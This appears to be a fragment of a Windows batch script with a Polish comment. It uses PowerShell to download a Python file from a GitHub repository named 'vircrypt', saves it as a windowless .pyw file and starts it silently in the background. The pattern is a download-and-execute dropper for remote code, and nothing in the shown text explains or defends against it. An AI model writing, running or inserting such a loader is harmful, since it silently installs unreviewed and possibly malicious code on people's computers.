...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ex0my/vircrypt/refs/heads/main/TSTSTS2.py' -OutFile '%folder%\TSTSTS2.pyw'"

REM Uruchamiamy skrypt Pythona w tle
start /B python "%folder%\TSTSTS2.pyw"
